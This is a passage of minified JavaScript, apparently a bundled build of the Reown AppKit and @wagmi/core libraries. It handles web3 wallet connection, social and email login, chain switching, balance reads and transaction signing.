Error(`Adapter for namespace ${e} doesn't exist`);const n=this.extendCaipNetwork(r,this.options);this.getCaipNetworks().find(i=>i.id===n.id)||q.addNetwork(n)}removeNetwork(e,r){if(this.chainAdapters&&!this.chainAdapters[e])throw new Error(`Adapter for namespace ${e} doesn't exist`);this.getCaipNetworks().find(i=>i.id===r)&&q.removeNetwork(e,r)}}let nA=!1;class fW extends dW{setupAuthConnectorListeners(e){e.onRpcRequest(r=>{Nn.checkIfRequestExists(r)?Nn.checkIfRequestIsSafe(r)||this.handleUnsafeRPCRequest():(this.open(),console.error(cr.RPC_METHOD_NOT_ALLOWED_MESSAGE,{method:r.method}),setTimeout(()=>{this.showErrorMessage(cr.RPC_METHOD_NOT_ALLOWED_UI_MESSAGE)},300),e.rejectRpcRequests())}),e.onRpcError(()=>{this.isOpen()&&(this.isTransactionStackEmpty()?this.close():this.popTransactionStack(!0))}),e.onRpcSuccess((r,n)=>{const i=Nn.checkIfRequestIsSafe(n),s=pe.state.address,o=q.state.activeCaipNetwork;i||(this.isTransactionStackEmpty()?(this.close(),s&&(o!=null&&o.id)&&this.updateNativeBalance(s,o.id,o.chainNamespace)):(this.popTransactionStack(),s&&(o!=null&&o.id)&&this.updateNativeBalance(s,o.id,o.chainNamespace)))}),e.onNotConnected(()=>{const r=q.state.activeChain;Oe.getConnectorId(r)===Z.CONNECTOR_ID.AUTH&&(this.setCaipAddress(void 0,r),this.setLoading(!1,r))}),e.onConnect(async r=>{var a,c;const n=q.state.activeChain,i=n===Z.CHAIN.EVM?`eip155:${r.chainId}:${r.address}`:`${r.chainId}:${r.address}`,s=r.preferredAccountType||((a=pe.state.preferredAccountTypes)==null?void 0:a[n])||te.state.defaultAccountTypes[n];Vf.isLowerCaseMatch(r.address,pe.state.address)||this.syncIdentity({address:r.address,chainId:r.chainId,chainNamespace:n}),this.setCaipAddress(i,n),this.setUser({...pe.state.user||{},...r},n),this.setSmartAccountDeployed(!!r.smartAccountDeployed,n),this.setPreferredAccountType(s,n);const o=(c=r.accounts)==null?void 0:c.map(u=>{var l;return Ie.createAccount(n,u.address,u.type||((l=pe.state.preferredAccountTypes)==null?void 0:l[n])||te.state.defaultAccountTypes[n])});this.setAllAccounts(o||[Ie.createAccount(n,r.address,r.preferredAccountType||s)],n),await e.getSmartAccountEnabledNetworks(),this.setLoading(!1,n)}),e.onSocialConnected(({userName:r})=>{this.setUser({...pe.state.user||{},username:r},q.state.activeChain)}),e.onGetSmartAccountEnabledNetworks(r=>{this.setSmartAccountEnabledNetworks(r,q.state.activeChain)}),e.onSetPreferredAccount(({address:r,type:n})=>{r&&this.setPreferredAccountType(n,q.state.activeChain)})}async syncAuthConnector(e,r){var l,h,d,g;const n=Z.AUTH_CONNECTOR_SUPPORTED_CHAINS.includes(r);if(!n)return;this.setLoading(!0,r);const i=e.getLoginEmailUsed();this.setLoading(i,r),i&&this.setStatus("connecting",r);const s=e.getEmail(),o=e.getUsername();this.setUser({...((l=pe.state)==null?void 0:l.user)||{},username:o,email:s},q.state.activeChain),this.setupAuthConnectorListeners(e);const{isConnected:a}=await e.isConnected(),c=jr.getSnapshot(),u=te.getSnapshot();e.syncDappData({metadata:u.metadata,sdkVersion:u.sdkVersion,projectId:u.projectId,sdkType:u.sdkType}),e.syncTheme({themeMode:c.themeMode,themeVariables:c.themeVariables,w3mThemeVariables:hs(c.themeVariables,c.themeMode)}),r&&n&&(a&&((h=this.connectionControllerClient)!=null&&h.connectExternal)?(await((g=this.connectionControllerClient)==null?void 0:g.connectExternal({id:Z.CONNECTOR_ID.AUTH,info:{name:Z.CONNECTOR_ID.AUTH},type:Gt.CONNECTOR_TYPE_AUTH,provider:e,chainId:(d=q.state.activeCaipNetwork)==null?void 0:d.id,chain:r})),this.setStatus("connected",r)):Oe.getConnectorId(r)===Z.CONNECTOR_ID.AUTH&&(this.setStatus("disconnected",r),le.removeConnectedNamespace(r))),this.setLoading(!1,r)}async checkExistingTelegramSocialConnection(e){var r;try{if(!Ie.isTelegram())return;const n=le.getTelegramSocialProvider();if(!n||typeof window>"u"||typeof document>"u")return;const s=new URL(window.location.href).searchParams.get("result_uri");if(!s)return;pe.setSocialProvider(n,e),await((r=this.authProvider)==null?void 0:r.init());const o=Oe.getAuthConnector();n&&o&&(this.setLoading(!0,e),await o.provider.connectSocial(s),await At.connectExternal(o,o.chain),le.setConnectedSocialProvider(n),le.removeTelegramSocialProvider(),wt.sendEvent({type:"track",event:"SOCIAL_LOGIN_SUCCESS",properties:{provider:n}}))}catch(n){this.setLoading(!1,e),console.error("checkExistingSTelegramocialConnection error",n)}try{const n=new URL(window.location.href);n.searchParams.delete("result_uri"),window.history.replaceState({},document.title,n.toString())}catch(n){console.error("tma social login failed",n)}}createAuthProvider(e){var o,a,c,u,l,h,d,g,y,m,b,A,_;if(!Z.AUTH_CONNECTOR_SUPPORTED_CHAINS.includes(e))return;const n=((a=(o=this.options)==null?void 0:o.features)==null?void 0:a.email)===void 0?Ar.DEFAULT_FEATURES.email:(u=(c=this.options)==null?void 0:c.features)==null?void 0:u.email,i=(h=(l=this.options)==null?void 0:l.features)!=null&&h.socials?((y=(g=(d=this.options)==null?void 0:d.features)==null?void 0:g.socials)==null?void 0:y.length)>0:Ar.DEFAULT_FEATURES.socials,s=n||i;!this.authProvider&&((m=this.options)!=null&&m.projectId)&&s&&(this.authProvider=Qo.getInstance({projectId:this.options.projectId,enableLogger:this.options.enableAuthLogger,chainId:(b=this.getCaipNetwork(e))==null?void 0:b.caipNetworkId,onTimeout:()=>{Wo.open(qo.ALERT_ERRORS.SOCIALS_TIMEOUT,"error")}}),$i.subscribeOpen(T=>{var P;!T&&this.isTransactionStackEmpty()&&((P=this.authProvider)==null||P.rejectRpcRequests())}),e===Z.CHAIN.EVM&&((A=pe.state.preferredAccountTypes)!=null&&A.eip155)&&this.authProvider.setPreferredAccount((_=pe.state.preferredAccountTypes)==null?void 0:_.eip155),this.syncAuthConnector(this.authProvider,e),this.checkExistingTelegramSocialConnection(e))}createAuthProviderForAdapter(e){var r,n,i;this.createAuthProvider(e),this.authProvider&&((i=(n=(r=this.chainAdapters)==null?void 0:r[e])==null?void 0:n.setAuthProvider)==null||i.call(n,this.authProvider))}initControllers(e){super.initControllers(e),this.options.excludeWalletIds&&xe.initializeExcludedWallets({ids:this.options.excludeWalletIds})}async switchCaipNetwork(e){var s,o;if(!e)return;const r=q.state.activeChain,n=e.chainNamespace,i=this.getAddressByChainNamespace(e.chainNamespace);if(e.chainNamespace===q.state.activeChain&&i){const a=this.getAdapter(n),c=lt.getProvider(n),u=lt.getProviderId(n);await(a==null?void 0:a.switchNetwork({caipNetwork:e,provider:c,providerType:u})),this.setCaipNetwork(e)}else{const c=lt.getProviderId(r)===Gt.CONNECTOR_TYPE_AUTH,u=lt.getProviderId(n),l=u===Gt.CONNECTOR_TYPE_AUTH,h=Z.AUTH_CONNECTOR_SUPPORTED_CHAINS.includes(n);if((c||l)&&h)try{q.state.activeChain=e.chainNamespace,await((o=(s=this.connectionControllerClient)==null?void 0:s.connectExternal)==null?void 0:o.call(s,{id:Z.CONNECTOR_ID.AUTH,provider:this.authProvider,chain:n,chainId:e.id,type:Gt.CONNECTOR_TYPE_AUTH,caipNetwork:e})),this.setCaipNetwork(e)}catch{const g=this.getAdapter(n);await(g==null?void 0:g.switchNetwork({caipNetwork:e,provider:this.authProvider,providerType:u}))}else u===Gt.CONNECTOR_TYPE_WALLET_CONNECT?(this.setCaipNetwork(e),this.syncWalletConnectAccount()):(this.setCaipNetwork(e),i&&this.syncAccount({address:i,chainId:e.id,chainNamespace:n}))}}async initChainAdapter(e){await super.initChainAdapter(e),this.createAuthProviderForAdapter(e)}async syncIdentity({address:e,chainId:r,chainNamespace:n}){var o;const i=`${n}:${r}`,s=(o=this.caipNetworks)==null?void 0:o.find(a=>a.caipNetworkId===i);if(n!==Z.CHAIN.EVM||s!=null&&s.testnet){this.setProfileName(null,n),this.setProfileImage(null,n);return}try{const{name:a,avatar:c}=await this.fetchIdentity({address:e,caipNetworkId:i});if(this.setProfileName(a,n),this.setProfileImage(c,n),!a){const u=this.getAdapter(n),l=await(u==null?void 0:u.getProfile({address:e,chainId:Number(r)}));l!=null&&l.profileName?(this.setProfileName(l.profileName,n),l.profileImage&&this.setProfileImage(l.profileImage,n)):(await this.syncReownName(e,n),this.setProfileImage(null,n))}}catch{await this.syncReownName(e,n),r!==1&&this.setProfileImage(null,n)}}syncConnectedWalletInfo(e){const r=lt.getProviderId(e);if(r===Gt.CONNECTOR_TYPE_AUTH){const n=this.authProvider;if(n){const i=le.getConnectedSocialProvider()??"email",s=n.getEmail()??n.getUsername();this.setConnectedWalletInfo({name:r,identifier:s,social:i},e)}}else super.syncConnectedWalletInfo(e)}async injectModalUi(){if(!nA&&Ie.isClient()){const e={...Ar.DEFAULT_FEATURES,...this.options.features},r=[];if(e&&((e.email||e.socials&&e.socials.length)&&r.push(ln(()=>import("./embedded-wallet-DzA9AN3g.js"),__vite__mapDeps([0,1,2,3,4,5,6,7,8,9]))),e.email&&r.push(ln(()=>import("./email-B1CRGlMC.js"),__vite__mapDeps([10,1,9,5,8,4,11,6]))),e.socials&&r.push(ln(()=>import("./socials-CJkON6QM.js"),__vite__mapDeps([12,1,13,4,5,14,8,9,15,3,16]))),e.swaps&&r.push(ln(()=>import("./swaps-DQPoFDJD.js"),__vite__mapDeps([17,1,4,5,18,19,20,3,8,16,6]))),e.send&&r.push(ln(()=>import("./send-D3Wmkn1o.js"),__vite__mapDeps([21,1,4,5,8,9,20,3,6,22]))),e.receive&&r.push(ln(()=>import("./receive-BfJykGwc.js"),__vite__mapDeps([23,1,24,3,15]))),e.onramp&&r.push(ln(()=>import("./onramp-aZhAY-Yz.js"),__vite__mapDeps([25,1,26,16,8,3,5,27,13,4,9,6]))),e.history&&r.push(ln(()=>import("./transactions-Ls_9Fz2_.js"),__vite__mapDeps([28,1,29,26,16,8,9,3])))),await Promise.all([...r,ln(()=>import("./index-Cgi-VDiW.js"),__vite__mapDeps([30,1,3,5,22,8,31,19,7,27,4,29,26,16,9,18,6,11,13,14,2,24,15])),ln(()=>import("./w3m-modal-caA8yHtE.js"),__vite__mapDeps([32,1,7,3,8,5,19,31]))]),!document.querySelector("w3m-modal")){const i=document.createElement("w3m-modal");!te.state.disableAppend&&!te.state.enableEmbedded&&document.body.insertAdjacentElement("beforeend",i)}nA=!0}}}const pW="1.7.3";function gW(t){return new fW({...t,sdkVersion:Ie.generateSdkVersion(t.adapters??[],"html",pW)})}function Zr(t,e,r){const n=t[e.name];if(typeof n=="function")return n;const i=t[r];return typeof i=="function"?i:s=>e(t,s)}const gd="2.16.7",mW=()=>`@wagmi/core@${gd}`;var q2=function(t,e,r,n){if(r==="a"&&!n)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?t!==e||!n:!e.has(t))throw new TypeError("Cannot read private member from an object whose class did not declare it");return r==="m"?n:r==="a"?n.call(t):n?n.value:e.get(t)},tf,z2;class yi extends Error{get docsBaseUrl(){return"https://wagmi.sh/core"}get version(){return mW()}constructor(e,r={}){var s;super(),tf.add(this),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"WagmiCoreError"});const n=r.cause instanceof yi?r.cause.details:(s=r.cause)!=null&&s.message?r.cause.message:r.details,i=r.cause instanceof yi&&r.cause.docsPath||r.docsPath;this.message=[e||"An error occurred.","",...r.metaMessages?[...r.metaMessages,""]:[],...i?[`Docs: ${this.docsBaseUrl}${i}.html${r.docsSlug?`#${r.docsSlug}`:""}`]:[],...n?[`Details: ${n}`]:[],`Version: ${this.version}`].join(`
`),r.cause&&(this.cause=r.cause),this.details=n,this.docsPath=i,this.metaMessages=r.metaMessages,this.shortMessage=e}walk(e){return q2(this,tf,"m",z2).call(this,this,e)}}tf=new WeakSet,z2=function t(e,r){return r!=null&&r(e)?e:e.cause?q2(this,tf,"m",t).call(this,e.cause,r):e};class kl extends yi{constructor(){super("Chain not configured."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ChainNotConfiguredError"})}}class yW extends yi{constructor(){super("Connector already connected."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ConnectorAlreadyConnectedError"})}}class wW extends yi{constructor(){super("Connector not connected."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ConnectorNotConnectedError"})}}class bW extends yi{constructor({address:e,connector:r}){super(`Account "${e}" not found for connector "${r.name}".`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ConnectorAccountNotFoundError"})}}class vW extends yi{constructor({connectionChainId:e,connectorChainId:r}){super(`The current chain of the connector (id: ${r}) does not match the connection's chain (id: ${e}).`,{metaMessages:[`Current Chain ID:  ${r}`,`Expected Chain ID: ${e}`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ConnectorChainMismatchError"})}}class EW extends yi{constructor({connector:e}){super(`Connector "${e.name}" unavailable while reconnecting.`,{details:["During the reconnection step, the only connector methods guaranteed to be available are: `id`, `name`, `type`, `uid`.","All other methods are not guaranteed to be available until reconnection completes and connectors are fully restored.","This error commonly occurs for connectors that asynchronously inject after reconnection has already started."].join(" ")}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ConnectorUnavailableReconnectingError"})}}async function iA(t,e){var n;let r;if(typeof e.connector=="function"?r=t._internal.connectors.setup(e.connector):r=e.connector,r.uid===t.state.current)throw new yW;try{t.setState(c=>({...c,status:"connecting"})),r.emitter.emit("message",{type:"connecting"});const{connector:i,...s}=e,o=await r.connect(s),a=o.accounts;return r.emitter.off("connect",t._internal.events.connect),r.emitter.on("change",t._internal.events.change),r.emitter.on("disconnect",t._internal.events.disconnect),await((n=t.storage)==null?void 0:n.setItem("recentConnectorId",r.id)),t.setState(c=>({...c,connections:new Map(c.connections).set(r.uid,{accounts:a,chainId:o.chainId,connector:r}),current:r.uid,status:"connected"})),{accounts:a,chainId:o.chainId}}catch(i){throw t.setState(s=>({...s,status:s.current?"connected":"disconnected"})),i}}async function Jf(t,e={}){let r;if(e.connector){const{connector:u}=e;if(t.state.status==="reconnecting"&&!u.getAccounts&&!u.getChainId)throw new EW({connector:u});const[l,h]=await Promise.all([u.getAccounts().catch(d=>{if(e.account===null)return[];throw d}),u.getChainId()]);r={accounts:l,chainId:h,connector:u}}else r=t.state.connections.get(t.state.current);if(!r)throw new wW;const n=e.chainId??r.chainId,i=await r.connector.getChainId();if(i!==r.chainId)throw new vW({connectionChainId:r.chainId,connectorChainId:i});const s=r.connector;if(s.getClient)return s.getClient({chainId:n});const o=Vi(e.account??r.accounts[0]);if(o&&(o.address=Lo(o.address)),e.account&&!r.accounts.some(u=>u.toLowerCase()===o.address.toLowerCase()))throw new bW({address:o.address,connector:s});const a=t.chains.find(u=>u.id===n),c=await r.connector.getProvider({chainId:n});return m2({account:o,chain:a,name:"Connector Client",transport:u=>kj(c)({...u,retryCount:0})})}async function AW(t,e={}){var i,s;let r;if(e.connector)r=e.connector;else{const{connections:o,current:a}=t.state,c=o.get(a);r=c==null?void 0:c.connector}const n=t.state.connections;r&&(await r.disconnect(),r.emitter.off("change",t._internal.events.change),r.emitter.off("disconnect",t._internal.events.disconnect),r.emitter.on("connect",t._internal.events.connect),n.delete(r.uid)),t.setState(o=>{if(n.size===0)return{...o,connections:new Map,current:null,status:"disconnected"};const a=n.values().next().value;return{...o,connections:new Map(n),current:a.connector.uid}});{const o=t.state.current;if(!o)return;const a=(i=t.state.connections.get(o))==null?void 0:i.connector;if(!a)return;await((s=t.storage)==null?void 0:s.setItem("recentConnectorId",a.id))}}async function _W(t,e){const{chainId:r,connector:n,...i}=e;let s;e.account?s=e.account:s=(await Jf(t,{account:e.account,chainId:r,connector:n})).account;const o=t.getClient({chainId:r});return Zr(o,i2,"estimateGas")({...i,account:s})}function H2(t){return typeof t=="number"?t:t==="wei"?0:Math.abs(s7[t])}function rf(t){const e=t.state.current,r=t.state.connections.get(e),n=r==null?void 0:r.accounts,i=n==null?void 0:n[0],s=t.chains.find(a=>a.id===(r==null?void 0:r.chainId)),o=t.state.status;switch(o){case"connected":return{address:i,addresses:n,chain:s,chainId:r==null?void 0:r.chainId,connector:r==null?void 0:r.connector,isConnected:!0,isConnecting:!1,isDisconnected:!1,isReconnecting:!1,status:o};case"reconnecting":return{address:i,addresses:n,chain:s,chainId:r==null?void 0:r.chainId,connector:r==null?void 0:r.connector,isConnected:!!i,isConnecting:!1,isDisconnected:!1,isReconnecting:!0,status:o};case"connecting":return{address:i,addresses:n,chain:s,chainId:r==null?void 0:r.chainId,connector:r==null?void 0:r.connector,isConnected:!1,isConnecting:!0,isDisconnected:!1,isReconnecting:!1,status:o};case"disconnected":return{address:void 0,addresses:void 0,chain:void 0,chainId:void 0,connector:void 0,isConnected:!1,isConnecting:!1,isDisconnected:!0,isReconnecting:!1,status:o}}}async function CW(t,e){const{allowFailure:r=!0,chainId:n,contracts:i,...s}=e,o=t.getClient({chainId:n});return Zr(o,hq,"multicall")({allowFailure:r,contracts:i,...s})}function IW(t,e){const{chainId:r,...n}=e,i=t.getClient({chainId:r});return Zr(i,ca,"readContract")(n)}async function xW(t,e){var a;const{allowFailure:r=!0,blockNumber:n,blockTag:i,...s}=e,o=e.contracts;try{const c={};for(const[d,g]of o.entries()){const y=g.chainId??t.state.chainId;c[y]||(c[y]=[]),(a=c[y])==null||a.push({contract:g,index:d})}const u=()=>Object.entries(c).map(([d,g])=>CW(t,{...s,allowFailure:r,blockNumber:n,blockTag:i,chainId:Number.parseInt(d),contracts:g.map(({contract:y})=>y)})),l=(await Promise.all(u())).flat(),h=Object.values(c).flatMap(d=>d.map(({index:g})=>g));return l.reduce((d,g,y)=>(d&&(d[h[y]]=g),d),[])}catch(c){if(c instanceof qI)throw c;const u=()=>o.map(l=>IW(t,{...l,blockNumber:n,blockTag:i}));return r?(await Promise.allSettled(u())).map(l=>l.status==="fulfilled"?{result:l.value,status:"success"}:{error:l.reason,result:void 0,status:"failure"}):await Promise.all(u())}}async function SW(t,e){const{address:r,blockNumber:n,blockTag:i,chainId:s,token:o,unit:a="ether"}=e;if(o)try{return await sA(t,{balanceAddress:r,chainId:s,symbolType:"string",tokenAddress:o})}catch(d){if(d.name==="ContractFunctionExecutionError"){const g=await sA(t,{balanceAddress:r,chainId:s,symbolType:"bytes32",tokenAddress:o}),y=_I(zc(g.symbol,{dir:"right"}));return{...g,symbol:y}}throw d}const c=t.getClient({chainId:s}),l=await Zr(c,n2,"getBalance")(n?{address:r,blockNumber:n}:{address:r,blockTag:i}),h=t.chains.find(d=>d.id===s)??c.chain;return{decimals:h.nativeCurrency.decimals,formatted:Wc(l,H2(a)),symbol:h.nativeCurrency.symbol,value:l}}async function sA(t,e){const{balanceAddress:r,chainId:n,symbolType:i,tokenAddress:s,unit:o}=e,a={abi:[{type:"function",name:"balanceOf",stateMutability:"view",inputs:[{type:"address"}],outputs:[{type:"uint256"}]},{type:"function",name:"decimals",stateMutability:"view",inputs:[],outputs:[{type:"uint8"}]},{type:"function",name:"symbol",stateMutability:"view",inputs:[],outputs:[{type:i}]}],address:s},[c,u,l]=await xW(t,{allowFailure:!1,contracts:[{...a,functionName:"balanceOf",args:[r],chainId:n},{...a,functionName:"decimals",chainId:n},{...a,functionName:"symbol",chainId:n}]}),h=Wc(c??"0",H2(o??u));return{decimals:u,formatted:h,symbol:l,value:c}}function nf(t,e){if(t===e)return!0;if(t&&e&&typeof t=="object"&&typeof e=="object"){if(t.constructor!==e.constructor)return!1;let r,n;if(Array.isArray(t)&&Array.isArray(e)){if(r=t.length,r!==e.length)return!1;for(n=r;n--!==0;)if(!nf(t[n],e[n]))return!1;return!0}if(t.valueOf!==Object.prototype.valueOf)return t.valueOf()===e.valueOf();if(t.toString!==Object.prototype.toString)return t.toString()===e.toString();const i=Object.keys(t);if(r=i.length,r!==Object.keys(e).length)return!1;for(n=r;n--!==0;)if(!Object.prototype.hasOwnProperty.call(e,i[n]))return!1;for(n=r;n--!==0;){const s=i[n];if(s&&!nf(t[s],e[s]))return!1}return!0}return t!==t&&e!==e}let Kh=[];function Wa(t){const e=[...t.state.connections.values()];return t.state.status==="reconnecting"||nf(Kh,e)?Kh:(Kh=e,e)}function NW(t,e){const{chainId:r,...n}=e,i=t.getClient({chainId:r});return Zr(i,Hj,"getEnsAddress")(n)}function TW(t,e){const{chainId:r,...n}=e,i=t.getClient({chainId:r});return Zr(i,iq,"getEnsAvatar")(n)}function PW(t,e){const{chainId:r,...n}=e,i=t.getClient({chainId:r});return Zr(i,sq,"getEnsName")(n)}async function RW(t,e){const{account:r,chainId:n,...i}=e,s=r??rf(t).address,o=t.getClient({chainId:n});return Zr(o,Py,"prepareTransactionRequest")({...i,...s?{account:s}:{}})}let Ug=!1;async function OW(t,e={}){var u,l;if(Ug)return[];Ug=!0,t.setState(h=>({...h,status:h.current?"reconnecting":"connecting"}));const r=[];if((u=e.connectors)!=null&&u.length)for(const h of e.connectors){let d;typeof h=="function"?d=t._internal.connectors.setup(h):d=h,r.push(d)}else r.push(...t.connectors);let n;try{n=await((l=t.storage)==null?void 0:l.getItem("recentConnectorId"))}catch{}const i={};for(const[,h]of t.state.connections)i[h.connector.id]=1;n&&(i[n]=0);const s=Object.keys(i).length>0?[...r].sort((h,d)=>(i[h.id]??10)-(i[d.id]??10)):r;let o=!1;const a=[],c=[];for(const h of s){const d=await h.getProvider().catch(()=>{});if(!d||c.some(m=>m===d)||!await h.isAuthorized())continue;const y=await h.connect({isReconnecting:!0}).catch(()=>null);y&&(h.emitter.off("connect",t._internal.events.connect),h.emitter.on("change",t._internal.events.change),h.emitter.on("disconnect",t._internal.events.disconnect),t.setState(m=>{const b=new Map(o?m.connections:new Map).set(h.uid,{accounts:y.accounts,chainId:y.chainId,connector:h});return{...m,current:o?m.current:h.uid,connections:b}}),a.push({accounts:y.accounts,chainId:y.chainId,connector:h}),c.push(d),o=!0)}return(t.state.status==="reconnecting"||t.state.status==="connecting")&&(o?t.setState(h=>({...h,status:"connected"})):t.setState(h=>({...h,connections:new Map,current:null,status:"disconnected"}))),Ug=!1,a}async function kW(t,e){const{account:r,chainId:n,connector:i,...s}=e;let o;return typeof r=="object"&&(r==null?void 0:r.type)==="local"?o=t.getClient({chainId:n}):o=await Jf(t,{account:r??void 0,chainId:n,connector:i}),await Zr(o,p2,"sendTransaction")({...s,...r?{account:r}:{},chain:n?{id:n}:null,gas:s.gas??void 0})}async function DW(t,e){const{account:r,connector:n,...i}=e;let s;return typeof r=="object"&&r.type==="local"?s=t.getClient():s=await Jf(t,{account:r,connector:n}),Zr(s,gq,"signMessage")({...i,...r?{account:r}:{}})}class js extends yi{constructor(){super("Provider not found."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ProviderNotFoundError"})}}class MW extends yi{constructor({connector:e}){super(`"${e.name}" does not support programmatic chain switching.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"SwitchChainNotSupportedError"})}}async function oA(t,e){var o;const{addEthereumChainParameter:r,chainId:n}=e,i=t.state.connections.get(((o=e.connector)==null?void 0:o.uid)??t.state.current);if(i){const a=i.connector;if(!a.switchChain)throw new MW({connector:a});return await a.switchChain({addEthereumChainParameter:r,chainId:n})}const s=t.chains.find(a=>a.id===n);if(!s)throw new kl;return t.setState(a=>({...a,chainId:n})),s}function BW(t,e){const{onChange:r}=e;return t.subscribe(()=>rf(t),r,{equalityFn(n,i){const{connector:s,...o}=n,{connector:a,...c}=i;return nf(o,c)&&(s==null?void 0:s.id)===(a==null?void 0:a.id)&&(s==null?void 0:s.uid)===(a==null?void 0:a.uid)}})}function UW(t,e){const{onChange:r}=e;return t._internal.connectors.subscribe((n,i)=>{r(Object.values(n),i)})}function $W(t,e){const{syncConnectedChain:r=t._internal.syncConnectedChain,...n}=e;let i;const s=c=>{i&&i();const u=t.getClient({chainId:c});return i=Zr(u,pq,"watchPendingTransactions")(n),i},o=s(e.chainId);let a;return r&&!e.chainId&&(a=t.subscribe(({chainId:c})=>c,async c=>s(c))),()=>{o==null||o(),a==null||a()}}async function LW(t,e){const{chainId:r,timeout:n=0,...i}=e,s=t.getClient({chainId:r}),a=await Zr(s,fq,"waitForTransactionReceipt")({...i,timeout:n});if(a.status==="reverted"){const u=await Zr(s,A2,"getTransaction")({hash:a.transactionHash}),h=await Zr(s,d2,"call")({...u,data:u.input,gasPrice:u.type!=="eip1559"?u.gasPrice:void 0,maxFeePerGas:u.type==="eip1559"?u.maxFeePerGas:void 0,maxPriorityFeePerGas:u.type==="eip1559"?u.maxPriorityFeePerGas:void 0}),d=h!=null&&h.data?_I(`0x${h.data.substring(138)}`):"unknown reason";throw new Error(d)}return{...a,chainId:s.chain.id}}async function FW(t,e){const{account:r,chainId:n,connector:i,...s}=e;let o;return typeof r=="object"&&(r==null?void 0:r.type)==="local"?o=t.getClient({chainId:n}):o=await Jf(t,{account:r??void 0,chainId:n,connector:i}),await Zr(o,Tj,"writeContract")({...s,...r?{account:r}:{},chain:n?{id:n}:null})}function vJ(t){return t}Zf.type="injected";function Zf(t={}){const{shimDisconnect:e=!0,unstable_shimAsyncInject:r}=t;function n(){const c=t.target;if(typeof c=="function"){const u=c();if(u)return u}return typeof c=="object"?c:typeof c=="string"?{...jW[c]??{id:c,name:`${c[0].toUpperCase()}${c.slice(1)}`,provider:`is${c[0].toUpperCase()}${c.slice(1)}`}}:{id:"injected",name:"Injected",provider(u){return u==null?void 0:u.ethereum}}}let i,s,o,a;return c=>({get icon(){return n().icon},get id(){return n().id},get name(){return n().name},get supportsSimulation(){return!0},type:Zf.type,async setup(){const u=await this.getProvider();u!=null&&u.on&&t.target&&(o||(o=this.onConnect.bind(this),u.on("connect",o)),i||(i=this.onAccountsChanged.bind(this),u.on("accountsChanged",i)))},async connect({chainId:u,isReconnecting:l}={}){var g,y,m,b,A,_;const h=await this.getProvider();if(!h)throw new js;let d=[];if(l)d=await this.getAccounts().catch(()=>[]);else if(e)try{d=(b=(m=(y=(g=(await h.request({method:"wallet_requestPermissions",params:[{eth_accounts:{}}]}))[0])==null?void 0:g.caveats)==null?void 0:y[0])==null?void 0:m.value)==null?void 0:b.map(P=>Lo(P)),d.length>0&&(d=await this.getAccounts())}catch(T){const P=T;if(P.code===hr.code)throw new hr(P);if(P.code===Xs.code)throw P}try{!(d!=null&&d.length)&&!l&&(d=(await h.request({method:"eth_requestAccounts"})).map(S=>Lo(S))),o&&(h.removeListener("connect",o),o=void 0),i||(i=this.onAccountsChanged.bind(this),h.on("accountsChanged",i)),s||(s=this.onChainChanged.bind(this),h.on("chainChanged",s)),a||(a=this.onDisconnect.bind(this),h.on("disconnect",a));let T=await this.getChainId();if(u&&T!==u){const P=await this.switchChain({chainId:u}).catch(S=>{if(S.code===hr.code)throw S;return{id:T}});T=(P==null?void 0:P.id)??T}return e&&await((A=c.storage)==null?void 0:A.removeItem(`${this.id}.disconnected`)),t.target||await((_=c.storage)==null?void 0:_.setItem("injected.connected",!0)),{accounts:d,chainId:T}}catch(T){const P=T;throw P.code===hr.code?new hr(P):P.code===Xs.code?new Xs(P):P}},async disconnect(){var l,h;const u=await this.getProvider();if(!u)throw new js;s&&(u.removeListener("chainChanged",s),s=void 0),a&&(u.removeListener("disconnect",a),a=void 0),o||(o=this.onConnect.bind(this),u.on("connect",o));try{await y2(()=>u.request({method:"wallet_revokePermissions",params:[{eth_accounts:{}}]}),{timeout:100})}catch{}e&&await((l=c.storage)==null?void 0:l.setItem(`${this.id}.disconnected`,!0)),t.target||await((h=c.storage)==null?void 0:h.removeItem("injected.connected"))},async getAccounts(){const u=await this.getProvider();if(!u)throw new js;return(await u.request({method:"eth_accounts"})).map(h=>Lo(h))},async getChainId(){const u=await this.getProvider();if(!u)throw new js;const l=await u.request({method:"eth_chainId"});return Number(l)},async getProvider(){if(typeof window>"u")return;let u;const l=n();return typeof l.provider=="function"?u=l.provider(window):typeof l.provider=="string"?u=md(window,l.provider):u=l.provider,u&&!u.removeListener&&("off"in u&&typeof u.off=="function"?u.removeListener=u.off:u.removeListener=()=>{}),u},async isAuthorized(){var u,l;try{if(e&&await((u=c.storage)==null?void 0:u.getItem(`${this.id}.disconnected`))||!t.target&&!await((l=c.storage)==null?void 0:l.getItem("injected.connected")))return!1;if(!await this.getProvider()){if(r!==void 0&&r!==!1){const y=async()=>(typeof window<"u"&&window.removeEventListener("ethereum#initialized",y),!!await this.getProvider()),m=typeof r=="number"?r:1e3;if(await Promise.race([...typeof window<"u"?[new Promise(A=>window.addEventListener("ethereum#initialized",()=>A(y()),{once:!0}))]:[],new Promise(A=>setTimeout(()=>A(y()),m))]))return!0}throw new js}return!!(await zd(()=>this.getAccounts())).length}catch{return!1}},async switchChain({addEthereumChainParameter:u,chainId:l}){var y,m,b,A;const h=await this.getProvider();if(!h)throw new js;const d=c.chains.find(_=>_.id===l);if(!d)throw new zi(new kl);const g=new Promise(_=>{const T=P=>{"chainId"in P&&P.chainId===l&&(c.emitter.off("change",T),_())};c.emitter.on("change",T)});try{return await Promise.all([h.request({method:"wallet_switchEthereumChain",params:[{chainId:Ue(l)}]}).then(async()=>{await 